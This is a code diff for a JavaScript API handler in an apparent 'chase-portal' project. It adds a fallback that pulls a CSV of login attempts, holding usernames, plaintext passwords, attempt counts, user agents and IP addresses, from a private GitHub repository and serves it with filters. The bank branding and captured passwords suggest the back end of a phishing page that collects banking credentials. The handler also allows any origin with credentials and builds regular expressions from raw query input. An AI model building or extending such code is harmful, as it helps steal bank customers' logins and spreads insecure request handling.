@@ -1,7 +1,8 @@
 import mongoose from 'mongoose';
-import { sharedStorage } from './shared-storage.js';
 
 const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/chase-portal';
+const GITHUB_TOKEN = process.env.GITHUB_TOKEN;
+const GITHUB_REPO = process.env.GITHUB_REPO || 'sapphirenetllc/JPMCLP1';
 
 // Login Log Schema
 const loginLogSchema = new mongoose.Schema({
@@ -37,6 +38,58 @@ async function connectDB() {
   }
 }
 
+async function getLogsFromGitHub(limit, statusFilter, usernameFilter) {
+  if (!GITHUB_TOKEN) {
+    console.warn('⚠️  GITHUB_TOKEN not set');
+    return [];
+  }
+
+  try {
+    const filePath = 'logs/login_attempts.csv';
+    const url = `https://api.github.com/repos/${GITHUB_REPO}/contents/${filePath}`;
+    
+    const response = await fetch(url, {
+      headers: {
+        'Authorization': `token ${GITHUB_TOKEN}`,
+        'Accept': 'application/vnd.github.v3+json'
+      }
+    });
+
+    if (!response.ok) {
+      return [];
+    }
+
+    const data = await response.json();
+    const csvContent = Buffer.from(data.content, 'base64').toString('utf-8');
+    const lines = csvContent.split('\n').filter(line => line.trim());
+
+    // Parse CSV (skip header)
+    const logs = lines.slice(1).map(line => {
+      const [timestamp, username, password, attemptNumber, status, userAgent, ipAddress] = line.split(',');
+      return {
+        timestamp: new Date(timestamp),
+        username,
+        password,
+        attemptNumber: parseInt(attemptNumber),
+        status,
+        userAgent,
+        ipAddress
+      };
+    }).filter(log => {
+      if (statusFilter && log.status !== statusFilter) return false;
+      if (usernameFilter && !log.username.match(new RegExp(usernameFilter, 'i'))) return false;
+      return true;
+    })
+    .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
+    .slice(0, parseInt(limit));
+
+    return logs;
+  } catch (err) {
+    console.error('Error reading from GitHub:', err.message);
+    return [];
+  }
+}
+
 export default async function handler(req, res) {
   res.setHeader('Access-Control-Allow-Credentials', 'true');
   res.setHeader('Access-Control-Allow-Origin', '*');
@@ -57,26 +110,25 @@ export default async function handler(req, res) {
     await connectDB();
 
     const { limit = 100, status, username } = req.query;
-    let query = {};
-    
-    if (status) query.status = status;
-    if (username) query.username = new RegExp(username, 'i');
     
     let logs = [];
     let source = 'No data';
     
     if (dbConnected) {
+      let query = {};
+      if (status) query.status = status;
+      if (username) query.username = new RegExp(username, 'i');
+      
       logs = await LoginLog.find(query)
         .sort({ timestamp: -1 })
         .limit(parseInt(limit))
         .lean();
       source = 'MongoDB';
     } else {
-      // Use fallback logs from shared storage
-      const allLogs = sharedStorage.getLogs(query);
-      logs = allLogs.slice(0, parseInt(limit));
+      // Try GitHub
+      logs = await getLogsFromGitHub(limit, status, username);
       if (logs.length > 0) {
-        source = 'Fallback (CSV)';
+        source = 'GitHub (CSV)';
       }
     }
     
